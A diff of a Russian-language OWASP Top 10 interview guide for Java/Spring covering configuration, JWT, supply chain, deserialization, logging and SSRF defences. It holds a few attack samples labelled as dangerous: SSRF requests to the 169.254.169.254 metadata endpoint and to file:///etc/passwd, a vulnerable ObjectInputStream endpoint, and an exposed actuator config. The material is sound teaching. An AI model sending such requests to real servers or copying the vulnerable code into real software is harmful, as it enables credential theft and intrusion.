+| `CORS: allowedOrigins("*")` | Доступ с любого домена | Явный whitelist origin-ов |
+| Дефолтные credentials | Полный доступ | Генерация уникальных паролей |
+| `server.error.include-stacktrace=always` | Утечка внутренней структуры | `never` в проде |
+| Debug-логирование в проде | Утечка данных через логи | `INFO` уровень в проде |
+
+**Пример проблемы — Actuator:**
+```yaml
+# ОПАСНО: все actuator эндпоинты открыты
+management:
+  endpoints:
+    web:
+      exposure:
+        include: "*"  # /actuator/env покажет секреты!
+```
+
+**Безопасная конфигурация:**
+```yaml
+management:
+  endpoints:
+    web:
+      exposure:
+        include: health,info,prometheus
+      base-path: /internal  # не /actuator
+  endpoint:
+    health:
+      show-details: when-authorized
+    env:
+      enabled: false  # отключаем полностью
+```
+
+## Q19. Как правильно настроить security headers?
+
+Security headers — дешёвый и эффективный слой защиты. В `Spring Security`:
+
+```java
+@Bean
+public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    http.headers(headers -> headers
+        // Запрет embedding в iframe (clickjacking)
+        .frameOptions(frame -> frame.deny())
+        // Запрет MIME-sniffing
+        .contentTypeOptions(Customizer.withDefaults())
+        // HSTS — принудительный HTTPS
+        .httpStrictTransportSecurity(hsts -> hsts
+            .includeSubDomains(true)
+            .maxAgeInSeconds(31536000))
+        // CSP — контроль загружаемых ресурсов
+        .contentSecurityPolicy(csp -> csp
+            .policyDirectives("default-src 'self'; script-src 'self'; " +
+                              "style-src 'self' 'unsafe-inline'; img-src 'self' data:"))
+        // Referrer Policy
+        .referrerPolicy(referrer -> referrer
+            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
+        // Permissions Policy
+        .permissionsPolicy(permissions -> permissions
+            .policy("camera=(), microphone=(), geolocation=()"))
+    );
+    return http.build();
+}
+```
+
+Проверить headers можно через [securityheaders.com](https://securityheaders.com/).
+
+## Q20. Как разделить конфигурацию между dev и prod?
+
+Ключевой принцип: **prod-конфигурация должна быть secure by default**, dev-расширения включаются явно:
+
+```yaml
+# application.yml — общие настройки (безопасные по умолчанию)
+spring:
+  jpa:
+    open-in-view: false
+    show-sql: false
+
+management:
+  endpoints:
+    web:
+      exposure:
+        include: health,info
+
+---
+# application-dev.yml — только для разработки
+spring:
+  config:
+    activate:
+      on-profile: dev
+  h2:
+    console:
+      enabled: true
+  jpa:
+    show-sql: true
+
+management:
+  endpoints:
+    web:
+      exposure:
+        include: "*"  # допустимо только в dev
+
+---
+# application-prod.yml
+spring:
+  config:
+    activate:
+      on-profile: prod
+  datasource:
+    url: ${DATABASE_URL}  # из переменных окружения
+    username: ${DB_USER}
+    password: ${DB_PASSWORD}
+
+server:
+  error:
+    include-stacktrace: never
+    include-message: never
+```
+
+> Секреты **никогда** не должны быть в `application.yml` — только из env-переменных, `Vault` или `Secret Manager` (см. Q37).
+
+---
+
+## Q21. (!) Как выявлять и управлять уязвимыми зависимостями?
+
+`Vulnerable and Outdated Components` (`A06:2021`) — использование библиотек с известными `CVE`. Проблема часто **транзитивная**: уязвимость в зависимости зависимости.
+
+**Инструменты для Java/Gradle:**
+
+```groovy
+// build.gradle — OWASP Dependency-Check
+plugins {
+    id 'org.owasp.dependencycheck' version '9.0.9'
+}
+
+dependencyCheck {
+    failBuildOnCVSS = 7.0f  // fail на High и Critical
+    formats = ['HTML', 'JSON']
+    suppressionFile = 'owasp-suppressions.xml'  // false positives
+}
+```
+
+```groovy
+// Gradle — отображение дерева зависимостей для анализа
+// ./gradlew dependencies --configuration runtimeClasspath
+```
+
+**Процесс управления:**
+
+```mermaid
+graph LR
+    A[SCA scan<br/>в CI/CD] --> B{CVE найдены?}
+    B -->|Нет| C[Деплой]
+    B -->|Да| D{Severity}
+    D -->|Critical/High| E[Block release<br/>Исправить немедленно]
+    D -->|Medium| F[Создать задачу<br/>SLA: 30 дней]
+    D -->|Low| G[Backlog]
+    E --> H[Обновить зависимость]
+    H --> I[Регрессионные тесты]
+    I --> A
+```
+
+## Q22. Что такое SBOM и зачем он нужен?
+
+`SBOM` (`Software Bill of Materials`) — полный перечень всех компонентов, включённых в приложение, с версиями и лицензиями. Аналог списка ингредиентов на упаковке продукта.
+
+**Генерация SBOM в формате CycloneDX:**
+```groovy
+// build.gradle
+plugins {
+    id 'org.cyclonedx.bom' version '1.8.2'
+}
+
+cyclonedxBom {
+    includeConfigs = ['runtimeClasspath']
+    outputFormat = 'json'
+    schemaVersion = '1.5'
+}
+// ./gradlew cyclonedxBom → build/reports/bom.json
+```
+
+Зачем нужен SBOM:
+- **Быстрая реакция на CVE** — при появлении уязвимости в `Log4j` можно за секунды проверить, используется ли она
+- **Compliance** — многие регуляторы (FDA, CISA) требуют SBOM
+- **Лицензионный аудит** — выявление несовместимых лицензий
+- **Supply chain transparency** — понимание, что именно входит в артефакт
+
+## Q23. Как организовать SCA в CI/CD pipeline?
+
+`SCA` (`Software Composition Analysis`) — автоматическая проверка зависимостей на уязвимости:
+
+```yaml
+# GitLab CI пример
+dependency-check:
+  stage: security
+  script:
+    - ./gradlew dependencyCheckAnalyze
+  artifacts:
+    paths:
+      - build/reports/dependency-check-report.html
+  allow_failure: false  # блокирует MR при критичных CVE
+
+# Дополнительно — Trivy для контейнеров
+container-scan:
+  stage: security
+  script:
+    - trivy image --severity HIGH,CRITICAL --exit-code 1 $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
+```
+
+Ключевые практики:
+- **Сканирование при каждом MR** — раннее обнаружение
+- **Подавление false positives** — файл `owasp-suppressions.xml` с обоснованием
+- **Мониторинг runtime** — новые CVE могут появиться после деплоя
+- **Renovate/Dependabot** — автоматические MR на обновление зависимостей
+
+---
+
+## Q24. (!) Какие ошибки аутентификации наиболее опасны?
+
+`Identification and Authentication Failures` (`A07:2021`) — ошибки, дающие злоумышленнику доступ под чужой учётной записью:
+
+1. **Слабая политика паролей** — минимум 8 символов недостаточен, нужна проверка по словарям утечек
+2. **Отсутствие `MFA`** — для критичных систем `MFA` обязателен
+3. **Уязвимый password recovery** — предсказуемые токены, отсутствие rate limiting
+4. **`Session fixation`** — сессия не пересоздаётся после логина
+5. **Длинноживущие токены** — `JWT` без expiration или с expiration в неделю
+6. **Отсутствие lockout** — неограниченные попытки ввода пароля
+7. **Утечка информации** — «пользователь не найден» vs «неверный пароль» (подсказка атакующему)
+
+```java
+// ПЛОХО: раскрывает существование пользователя
+if (user == null) throw new AuthException("User not found");
+if (!matches(password)) throw new AuthException("Wrong password");
+
+// ХОРОШО: единообразный ответ
+if (user == null || !passwordEncoder.matches(password, user.getPassword())) {
+    throw new BadCredentialsException("Invalid credentials");
+}
+```
+
+Подробнее о паттернах аутентификации — в [вопросах по аутентификации](authentication-authorization-patterns-interview.md), о `OAuth2` — в [вопросах по OAuth2](oauth2-interview.md).
+
+## Q25. Как защититься от brute force и credential stuffing?
+
+**Rate limiting + progressive delay + account lockout:**
 
 ```java
 @Service
-public class AuthService {
+@RequiredArgsConstructor
+public class LoginProtectionService {
 
- private final UserRepository userRepository;
- private final PasswordEncoder passwordEncoder;
- private final Cache<String, Integer> loginAttemptsCache;
+    private final Cache<String, LoginAttempts> attemptsCache;
 
- public AuthenticationResponse authenticate(LoginRequest request) {
- User user = userRepository.findByUsername(request.getUsername()).orElseThrow(() -> new BadCredentialsException("Invalid credentials"));
+    public void checkAndRecord(String username, String clientIp, boolean success) {
+        String key = username + ":" + clientIp;
+        LoginAttempts attempts = attemptsCache.get(key, k -> new LoginAttempts());
 
- String cacheKey = "login_attempts:" + user.getId();
- Integer attempts = loginAttemptsCache.getIfPresent(cacheKey);
+        if (attempts.isLocked()) {
+            throw new AccountLockedException(
+                "Account locked. Try again in " + attempts.getLockRemainingMinutes() + " min");
+        }
 
- if (attempts!= null && attempts >= 5) {
- throw new AccountLockedException("Account is temporarily locked due to too many failed attempts");
- }
-
- if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
- loginAttemptsCache.put(cacheKey, attempts!= null? attempts + 1: 1);
- throw new BadCredentialsException("Invalid credentials");
- }
-
- // Успешная аутентификация - сброс счетчика
- loginAttemptsCache.invalidate(cacheKey);
-
- return generateToken(user);
- }
+        if (success) {
+            attemptsCache.invalidate(key);
+        } else {
+            attempts.increment();
+            // Progressive lockout: 5 попыток → блок 1 мин, 10 → 5 мин, 15 → 30 мин
+            if (attempts.getCount() >= 15) {
+                attempts.lockFor(Duration.ofMinutes(30));
+            } else if (attempts.getCount() >= 10) {
+                attempts.lockFor(Duration.ofMinutes(5));
+            } else if (attempts.getCount() >= 5) {
+                attempts.lockFor(Duration.ofMinutes(1));
+            }
+        }
+    }
 }
 ```
 
-## A08:2021 Software Integrity Failures
+**Credential stuffing** — атака с использованием утёкших пар логин/пароль из других сервисов. Дополнительные меры:
+- Проверка паролей по базе утечек (`HaveIBeenPwned` API)
+- `CAPTCHA` после N неудачных попыток
+- Детекция аномалий: новый IP, необычный User-Agent, массовые запросы
 
-Проблемы с целостностью ПО и данных. ### Типы проблем
+## Q26. Как безопасно управлять JWT-токенами?
 
-#### 1. `Unsigned Software`
+`JWT` — распространённый механизм stateless-аутентификации, но с типичными ошибками:
 
-Использование неподписанного или неправильно подписанного ПО. #### 2. `Automatic Updates` from `Untrusted Sources`
-
-Загрузка обновлений из ненадежных источников. #### 3. `CI / CD Pipeline Vulnerabilities`
-
-Уязвимости в процессах сборки и развертывания. ### Защита от `Integrity Failures`
-
-#### 1. `Code Signing`
-
-```bash
-# Создание keystore для подписи
-keytool -genkeypair -alias mykey -keyalg RSA -keysize 2048 -keystore keystore.jks
-
-# Подпись JAR файла
-jarsigner -keystore keystore.jks -signedjar signed-app.jar app.jar mykey
-```
-
-#### 2. `Secure CI / CD Pipeline`
-
-```yaml
-#.github/workflows/secure-build.yml
-name: Secure Build and Deploy
-on:
- push:
- branches: [ main ]
-
-jobs:
- build:
- runs-on: ubuntu-latest
-
- steps:
- - uses: actions/checkout@v3
- with:
- fetch-depth: 0
-
- - name: Verify commit signatures
- run: |
- # Проверка подписей коммитов
- git log --show-signature --oneline -10
-
- - name: Security scan
- uses: github/super-linter@v4
-
- - name: Dependency check
- uses: dependency-check/Dependency-Check_Action@main
-
- - name: Build and sign
- run: |./mvnw clean package
- jarsigner -keystore keystore.jks -signedjar signed-app.jar target/app.jar mykey
-
- - name: Deploy to staging
- if: success()
- run: |
- # Secure deployment with checksum verification
- sha256sum signed-app.jar > app.sha256
- # Deploy logic...
-```
-
-#### 3. `SBOM` (`Software Bill` of `Materials`)
-
-```xml
-<!-- pom.xml -->
-<build>
- <plugins>
- <plugin>
- <groupId>org.cyclonedx</groupId>
- <artifactId>cyclonedx-maven-plugin</artifactId>
- <version>2.7.4</version>
- <executions>
- <execution>
- <phase>package</phase>
- <goals>
- <goal>makeBom</goal>
- </goals>
- </execution>
- </executions>
- </plugin>
- </plugins>
-</build>
-```
-
-## A09:2021 Security Logging and Monitoring Failures
-
-Недостаточное логирование и мониторинг событий безопасности. ### Важность `Security Logging`
-
-1. `Detection`: Выявление атак и подозрительной активности
-2. `Investigation`: Анализ инцидентов безопасности
-3. `Compliance`: Соответствие требованиям регуляторов
-4. `Forensics`: Судебные расследования
-
-### Что логировать
-
-#### 1. `Authentication Events`
+| Ошибка | Последствие | Правильный подход |
+|--------|------------|-------------------|
+| `alg: none` | Токен без подписи принимается | Явно указывать допустимые алгоритмы |
+| Хранение секретов в payload | Утечка данных | Минимум данных: `sub`, `roles`, `exp` |
+| Длинный `exp` (дни/недели) | Невозможно отозвать | Access token: 15 мин, refresh: 7 дней |
+| Секрет-подпись `"secret"` | Подделка токенов | RSA/EC ключи, минимум 256 бит |
+| Нет `aud`/`iss` validation | Token confusion | Всегда проверять `audience` и `issuer` |
 
 ```java
-@Service
-public class AuthService {
+// Безопасная конфигурация JWT в Spring Security
+@Bean
+public JwtDecoder jwtDecoder() {
+    NimbusJwtDecoder decoder = NimbusJwtDecoder
+            .withPublicKey(rsaPublicKey)
+            .build();
 
- private final Logger logger = LoggerFactory.getLogger(AuthService.class);
-
- public AuthenticationResponse authenticate(LoginRequest request) {
- String username = request.getUsername();
-
- try {
- User user = userRepository.findByUsername(username).orElseThrow(() -> new BadCredentialsException("User not found"));
-
- if (!passwordEncoder.matches(request.getPassword(), user.getPassword())) {
- logger.warn("Failed login attempt for user: {} from IP: {}",
- username, getClientIp());
- throw new BadCredentialsException("Invalid credentials");
- }
-
- logger.info("Successful login for user: {} from IP: {}",
- username, getClientIp());
-
- return generateToken(user);
-
- } catch (BadCredentialsException e) {
- logger.warn("Failed login attempt for user: {} from IP: {}",
- username, getClientIp());
- throw e;
- }
- }
+    // Валидация claims
+    OAuth2TokenValidator<Jwt> validators = new DelegatingOAuth2TokenValidator<>(
+        JwtValidators.createDefaultWithIssuer("https://auth.example.com"),
+        new JwtClaimValidator<List<String>>("aud", 
+            aud -> aud.contains("my-api")),
+        new JwtTimestampValidator(Duration.ofSeconds(30)) // clock skew
+    );
+    decoder.setJwtValidator(validators);
+    return decoder;
 }
 ```
 
-#### 2. `Authorization Failures`
+---
+
+## Q27. (!) Что такое supply-chain атаки и как от них защищаться?
+
+`Software and Data Integrity Failures` (`A08:2021`) — **новая категория**, покрывающая атаки на цепочку поставки ПО:
+
+```mermaid
+graph LR
+    A[Атакующий] --> B[Компрометация<br/>npm/Maven пакета]
+    A --> C[Компрометация<br/>CI/CD pipeline]
+    A --> D[Подмена<br/>Docker-образа]
+    A --> E[Dependency<br/>confusion]
+    
+    B --> F[Вредоносный код<br/>в продакшене]
+    C --> F
+    D --> F
+    E --> F
+```
+
+**Реальные примеры:**
+- **`SolarWinds`** (2020) — компрометация build-системы, вредоносный код в обновлении
+- **`Log4Shell`** (2021) — уязвимость в повсеместно используемой библиотеке
+- **`Codecov`** (2021) — подмена bash-скрипта в CI/CD
+- **`Dependency confusion`** — публичный пакет с именем внутреннего, npm/Maven берёт публичный
+
+**Защита:**
+- **Подпись артефактов** — GPG-подпись JAR-файлов, `Sigstore`/`cosign` для контейнеров
+- **Проверка checksums** — `gradle --verify-metadata` с `verification-metadata.xml`
+- **Private registry** — Nexus/Artifactory как proxy с контролем
+- **Pinning версий** — точные версии вместо диапазонов (`1.2.3`, не `1.+`)
+- **SBOM** — полный учёт всех компонентов (см. Q22)
+
+## Q28. Чем опасна небезопасная десериализация в Java?
+
+Небезопасная десериализация позволяет выполнить **произвольный код** на сервере через специально сконструированный объект:
+
+**Уязвимый код:**
+```java
+// ОПАСНО: десериализация произвольного объекта из HTTP-запроса
+@PostMapping("/api/import")
+public void importData(@RequestBody byte[] data) {
+    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+    Object obj = ois.readObject(); // RCE через gadget chain!
+    processData(obj);
+}
+```
+
+**Защита:**
+
+1. **Не использовать Java serialization** для внешних данных — использовать `JSON` (`Jackson`) или `Protobuf`
+2. Если нужна Java serialization — **whitelist классов**:
+
+```java
+// ObjectInputFilter (Java 9+)
+ObjectInputStream ois = new ObjectInputStream(input);
+ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(
+    "com.myapp.dto.*;!*"  // только свои DTO, всё остальное — reject
+));
+```
+
+3. **Jackson** тоже требует осторожности:
+```java
+ObjectMapper mapper = new ObjectMapper();
+// ОПАСНО: включает полиморфную десериализацию
+// mapper.enableDefaultTyping(); // НИКОГДА не делать
+
+// Безопасно: явная аннотация только где нужно
+@JsonTypeInfo(use = Id.NAME, property = "type")
+@JsonSubTypes({
+    @JsonSubTypes.Type(value = CreditCard.class, name = "credit"),
+    @JsonSubTypes.Type(value = BankTransfer.class, name = "bank")
+})
+public abstract class PaymentMethod { }
+```
+
+## Q29. Как защитить CI/CD pipeline от компрометации?
+
+CI/CD pipeline — привилегированная среда с доступом к секретам и деплою. Защита:
+
+```yaml
+# GitLab CI — принципы безопасного pipeline
+stages:
+  - build
+  - security
+  - test
+  - deploy
+
+build:
+  stage: build
+  script:
+    - ./gradlew build -x test
+  # Принцип: минимальные права у CI runner
+  tags: [restricted-runner]
+
+verify-signatures:
+  stage: security
+  script:
+    # Проверка подписей зависимостей
+    - ./gradlew --write-verification-metadata sha256
+    - git diff --exit-code gradle/verification-metadata.xml
+
+security-scan:
+  stage: security
+  script:
+    - ./gradlew dependencyCheckAnalyze
+    - trivy image --exit-code 1 $IMAGE
+  # Разделение: security-сканирование — отдельный stage с отдельными правами
+```
+
+Ключевые практики:
+- **Изоляция секретов** — CI-переменные доступны только нужным стадиям
+- **Immutable runners** — runner пересоздаётся после каждой задачи
+- **Protected branches** — деплой только с `main`, merge requires approval
+- **Аудит изменений** — все изменения в `.gitlab-ci.yml` требуют ревью
+- **Минимальные права** — deploy token имеет только `push` к registry
+
+---
+
+## Q30. (!) Что должна включать стратегия security-логирования?
+
+`Security Logging and Monitoring Failures` (`A09:2021`) — если атака не записана и не алертится, инцидент обнаруживается слишком поздно. Средний TTD (Time to Detect) breach — **287 дней** (IBM Cost of Data Breach Report).
+
+**Три компонента стратегии:**
+
+```mermaid
+graph TD
+    A[Security Logging] --> B[Что логировать]
+    A --> C[Как логировать]
+    A --> D[Как реагировать]
+    
+    B --> B1[Auth events]
+    B --> B2[Access denied]
+    B --> B3[Input validation failures]
+    B --> B4[Sensitive operations]
+    
+    C --> C1[Structured JSON logs]
+    C --> C2[Correlation ID]
+    C --> C3[Tamper-proof storage]
+    C --> C4[Retention policy]
+    
+    D --> D1[Real-time alerts]
+    D --> D2[SIEM correlation]
+    D --> D3[Incident runbooks]
+    D --> D4[On-call process]
+```
+
+**Критическое правило**: логирование без процесса реагирования почти бесполезно. Нужны алерты, runbooks и on-call.
+
+## Q31. Какие события безопасности обязательно логировать?
+
+**Обязательные security-события:**
 
 ```java
 @Aspect
 @Component
 public class SecurityAuditAspect {
 
- private final Logger auditLogger = LoggerFactory.getLogger("AUDIT");
+    private static final Logger auditLog = LoggerFactory.getLogger("SECURITY_AUDIT");
 
- @AfterThrowing(pointcut = "@annotation(org.springframework.security.access.prepost.PreAuthorize)",
- throwing = "ex")
- public void logAuthorizationFailure(JoinPoint joinPoint, Exception ex) {
- if (ex instanceof AccessDeniedException) {
- String methodName = joinPoint.getSignature().toString();
- String username = SecurityContextHolder.getContext().getAuthentication().getName();
+    // 1. Все попытки аутентификации (успешные и неуспешные)
+    @AfterReturning("execution(* *.authenticate(..))")
+    public void logSuccessfulAuth(JoinPoint jp) {
+        auditLog.info("AUTH_SUCCESS user={} ip={} ua={}",
+            getUsername(), getClientIp(), getUserAgent());
+    }
 
- auditLogger.warn("Authorization failure - User: {}, Method: {}, Reason: {}",
- username, methodName, ex.getMessage());
- }
- }
+    @AfterThrowing(pointcut = "execution(* *.authenticate(..))", throwing = "ex")
+    public void logFailedAuth(JoinPoint jp, Exception ex) {
+        auditLog.warn("AUTH_FAILURE user={} ip={} reason={}",
+            getAttemptedUsername(jp), getClientIp(), ex.getMessage());
+    }
+
+    // 2. Отказы авторизации
+    @AfterThrowing(pointcut = "@annotation(PreAuthorize)", throwing = "ex")
+    public void logAccessDenied(JoinPoint jp, AccessDeniedException ex) {
+        auditLog.warn("ACCESS_DENIED user={} resource={} method={}",
+            getUsername(), getResource(jp), jp.getSignature().getName());
+    }
+
+    // 3. Чувствительные операции
+    @Around("@annotation(AuditSensitive)")
+    public Object logSensitiveOp(ProceedingJoinPoint jp) throws Throwable {
+        auditLog.info("SENSITIVE_OP_START user={} operation={} params={}",
+            getUsername(), jp.getSignature().getName(), sanitize(jp.getArgs()));
+        try {
+            Object result = jp.proceed();
+            auditLog.info("SENSITIVE_OP_SUCCESS user={} operation={}",
+                getUsername(), jp.getSignature().getName());
+            return result;
+        } catch (Exception e) {
+            auditLog.error("SENSITIVE_OP_FAILURE user={} operation={} error={}",
+                getUsername(), jp.getSignature().getName(), e.getMessage());
+            throw e;
+        }
+    }
 }
 ```
 
-#### 3. `Sensitive Operations`
+**Чего НЕ логировать:**
+- Пароли, токены, секреты (даже замаскированные)
+- PII без необходимости (GDPR)
+- Полное тело запроса с чувствительными данными
 
-```java
-@Service
-public class AccountService {
+## Q32. Как настроить алертинг на security-события?
 
- private final Logger securityLogger = LoggerFactory.getLogger("SECURITY");
-
- @Transactional
- public void transferMoney(Long fromAccountId, Long toAccountId, BigDecimal amount) {
- Account fromAccount = accountRepository.findById(fromAccountId).orElseThrow(() -> new AccountNotFoundException("Source account not found"));
-
- Account toAccount = accountRepository.findById(toAccountId).orElseThrow(() -> new AccountNotFoundException("Destination account not found"));
-
- String username = SecurityContextHolder.getContext().getAuthentication().getName();
-
- // Логирование чувствительной операции
- securityLogger.info("Money transfer initiated - User: {}, From: {}, To: {}, Amount: {}",
- username, fromAccountId, toAccountId, amount);
-
- try {
- // Выполнение перевода
- fromAccount.debit(amount);
- toAccount.credit(amount);
-
- accountRepository.save(fromAccount);
- accountRepository.save(toAccount);
-
- securityLogger.info("Money transfer completed successfully - Transaction ID: {}",
- generateTransactionId());
-
- } catch (Exception e) {
- securityLogger.error("Money transfer failed - User: {}, From: {}, To: {}, Amount: {}, Error: {}",
- username, fromAccountId, toAccountId, amount, e.getMessage());
- throw e;
- }
- }
-}
-```
-
-### `Security Monitoring`
-
-#### 1. Log `Aggregation`
-
-```yaml
-# logback-spring.xml
-<configuration>
- <include resource="org/springframework/boot/logging/logback/defaults.xml"/>
-
- <!-- Security logs -->
- <appender name="SECURITY" class="ch.qos.logback.core.rolling.RollingFileAppender">
- <file>logs/security.log</file>
- <rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy">
- <fileNamePattern>logs/security.%d{yyyy-MM-dd}.%i.log</fileNamePattern>
- <timeBasedFileNamingAndTriggeringPolicy class="ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP">
- <maxFileSize>100MB</maxFileSize>
- </timeBasedFileNamingAndTriggeringPolicy>
- </rollingPolicy>
- <encoder>
- <pattern>%d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %msg%n</pattern>
- </encoder>
- </appender>
-
- <logger name="SECURITY" level="INFO" additivity="false">
- <appender-ref ref="SECURITY"/>
- </logger>
-
- <logger name="AUDIT" level="WARN" additivity="false">
- <appender-ref ref="SECURITY"/>
- </logger>
-</configuration>
-```
-
-#### 2. `Alerting`
+Алертинг — ключевое отличие между «мы логируем» и «мы обнаруживаем атаки»:
 
 ```java
 @Component
-public class SecurityEventListener {
+@RequiredArgsConstructor
+public class SecurityAlertService {
 
- private final AlertService alertService;
+    private final MeterRegistry meterRegistry;
+    private final NotificationService notificationService;
+    private final Cache<String, AtomicInteger> failedLoginCounter;
 
- @EventListener
- public void handleFailedLogin(FailedLoginEvent event) {
- // Проверка на brute force атаку
- int recentFailures = getRecentFailures(event.getUsername());
+    @EventListener
+    public void onAuthFailure(AuthenticationFailureEvent event) {
+        String username = event.getAuthentication().getName();
+        String ip = getClientIp();
 
- if (recentFailures >= 5) {
- alertService.sendAlert("Brute force attack detected for user: " + event.getUsername());
- }
+        // Метрика для Prometheus/Grafana
+        meterRegistry.counter("security.auth.failure",
+            "username", username, "ip", ip).increment();
 
- if (recentFailures >= 10) {
- // Автоматическая блокировка аккаунта
- accountService.lockAccount(event.getUsername());
- alertService.sendAlert("Account locked due to multiple failed login attempts: " + event.getUsername());
- }
- }
+        // Детекция brute force — 10+ неудач за 5 минут
+        AtomicInteger count = failedLoginCounter.get(ip, k -> new AtomicInteger(0));
+        if (count.incrementAndGet() >= 10) {
+            notificationService.sendAlert(
+                AlertLevel.HIGH,
+                "Brute force detected: 10+ failed logins from IP=" + ip);
+        }
+    }
 
- @EventListener
- public void handleSuspiciousActivity(SuspiciousActivityEvent event) {
- alertService.sendAlert("Suspicious activity detected: " + event.getDescription());
- }
+    @EventListener
+    public void onAccessDenied(AuthorizationDeniedEvent event) {
+        // Алерт на попытку доступа к admin-ресурсам
+        String resource = event.getSource().toString();
+        if (resource.contains("/admin/")) {
+            notificationService.sendAlert(
+                AlertLevel.MEDIUM,
+                "Admin access attempt by non-admin user");
+        }
+    }
 }
 ```
 
-## A10:2021 Server-Side Request Forgery
+Рекомендуемые метрики для дашбордов (подробнее в [вопросах по безопасности приложений](application-security-interview.md)):
+- `security.auth.failure.rate` — аномальный рост = brute force
+- `security.access_denied.rate` — аномальный рост = зондирование
+- `security.input_validation.failure.rate` — аномальный рост = injection-попытки
 
-`SSRF` позволяет злоумышленнику заставить сервер выполнить запросы к внутренним ресурсам или внешним сервисам. ### Как работает `SSRF`
+---
 
-#### 1. `Basic SSRF`
+## Q33. (!) Что такое SSRF и почему он попал в OWASP Top 10?
 
-```java
-// Уязвимый код
-@GetMapping("/fetch")
-public String fetchUrl(@RequestParam String url) {
- // Нет валидации URL!
- return restTemplate.getForObject(url, String.class);
-}
+`SSRF` (`Server-Side Request Forgery`, `A10:2021`) — **новая категория**, когда злоумышленник заставляет сервер выполнять запросы к произвольным адресам, включая внутренние сервисы.
 
-// Атака: /fetch?url=http://internal-service/admin/users
-// Или: /fetch?url=file:///etc/passwd
+Попал в Top 10 из-за роста cloud-инфраструктуры: через SSRF атакующий добирается до **metadata endpoints** (`169.254.169.254` в AWS/GCP), получает IAM-токены и компрометирует всю инфраструктуру.
+
+```mermaid
+sequenceDiagram
+    participant Атакующий
+    participant Сервер
+    participant InternalService
+    participant CloudMetadata
+
+    Атакующий->>Сервер: GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam
+    Сервер->>CloudMetadata: HTTP GET (от имени сервера!)
+    CloudMetadata-->>Сервер: IAM credentials
+    Сервер-->>Атакующий: IAM credentials (утечка!)
+    Атакующий->>InternalService: Доступ с украденными credentials
 ```
 
-#### 2. `Blind SSRF`
+**Типы SSRF:**
+- **Classic SSRF** — ответ внутреннего сервиса возвращается атакующему
+- **Blind SSRF** — ответ не виден, но факт запроса детектируется (OOB)
+- **Partial SSRF** — контроль только над частью URL (path, параметры)
 
-```java
-@PostMapping("/webhook")
-public void processWebhook(@RequestBody WebhookPayload payload) {
- // Сервер отправляет запросы на URL из payload
- // Злоумышленник может заставить сервер сканировать внутреннюю сеть
- restTemplate.postForObject(payload.getCallbackUrl(), payload.getData(), Void.class);
-}
-```
+## Q34. Как реализовать защиту от SSRF в Java?
 
-### Защита от `SSRF`
-
-#### 1. `URL Validation` and `Whitelisting`
+Многоуровневая защита:
 
 ```java
 @Service
-public class UrlValidator {
+public class SafeUrlFetcher {
 
- private static final List<String> ALLOWED_HOSTS = Arrays.asList(
- "api.github.com", "api.twitter.com", "api.linkedin.com"
- );
+    private static final Set<String> ALLOWED_SCHEMES = Set.of("http", "https");
+    private static final Set<String> ALLOWED_HOSTS = Set.of(
+        "api.github.com", "api.example.com");
 
- private static final List<String> ALLOWED_SCHEMES = Arrays.asList("http", "https");
+    public String fetch(String urlString) {
+        // 1. Валидация URL
+        URI uri = validateUrl(urlString);
+        
+        // 2. DNS-резолюция и проверка IP
+        InetAddress address = resolveAndValidate(uri.getHost());
+        
+        // 3. Запрос с таймаутами
+        return executeRequest(uri);
+    }
 
- public boolean isValidUrl(String url) {
- try {
- URI uri = new URI(url);
+    private URI validateUrl(String urlString) {
+        URI uri;
+        try {
+            uri = new URI(urlString);
+        } catch (URISyntaxException e) {
+            throw new IllegalArgumentException("Invalid URL");
+        }
 
- // Проверка схемы
- if (!ALLOWED_SCHEMES.contains(uri.getScheme())) {
- return false;
- }
+        // Проверка схемы
+        if (!ALLOWED_SCHEMES.contains(uri.getScheme())) {
+            throw new SecurityException("Scheme not allowed: " + uri.getScheme());
+        }
 
- // Проверка хоста
- String host = uri.getHost();
- if (host == null ||!ALLOWED_HOSTS.contains(host)) {
- return false;
- }
+        // Whitelist хостов (предпочтительно)
+        if (!ALLOWED_HOSTS.contains(uri.getHost())) {
+            throw new SecurityException("Host not allowed: " + uri.getHost());
+        }
 
- // Проверка на localhost и private IP
- if (isLocalhostOrPrivate(host)) {
- return false;
- }
+        return uri;
+    }
 
- return true;
+    private InetAddress resolveAndValidate(String host) {
+        try {
+            InetAddress addr = InetAddress.getByName(host);
 
- } catch (URISyntaxException e) {
- return false;
- }
- }
-
- private boolean isLocalhostOrPrivate(String host) {
- try {
- InetAddress address = InetAddress.getByName(host);
-
- // Проверка на localhost
- if (address.isLoopbackAddress()) {
- return true;
- }
-
- // Проверка на private IP ranges
- return address.isSiteLocalAddress() ||
- address.isLinkLocalAddress() ||
- isPrivateNetwork(address.getHostAddress());
-
- } catch (UnknownHostException e) {
- return true; // Блокируем неизвестные хосты
- }
- }
-
- private boolean isPrivateNetwork(String ip) {
- // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- return ip.startsWith("10.") ||
- (ip.startsWith("172.") && isInRange(ip, 16, 31)) ||
- ip.startsWith("192.168.");
- }
-
- private boolean isInRange(String ip, int start, int end) {
- try {
- int secondOctet = Integer.parseInt(ip.split("\\.")[1]);
- return secondOctet >= start && secondOctet <= end;
- } catch (Exception e) {
- return false;
- }
- }
+            // Блокировка приватных и служебных диапазонов
+            if (addr.isLoopbackAddress()         // 127.0.0.0/8
+                || addr.isSiteLocalAddress()      // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
+                || addr.isLinkLocalAddress()      // 169.254.0.0/16 (metadata endpoint!)
+                || addr.isAnyLocalAddress()) {    // 0.0.0.0
+                throw new SecurityException("Access to internal networks is forbidden");
+            }
+            return addr;
+        } catch (UnknownHostException e) {
+            throw new SecurityException("Cannot resolve host");
+        }
+    }
 }
 ```
 
-#### 2. `Network-Level Protection`
+**Сетевой уровень** (defense in depth):
+- `Network Policy` в Kubernetes — ограничить egress трафик подов
+- `VPC Security Groups` / firewall — запретить обращение к metadata endpoint
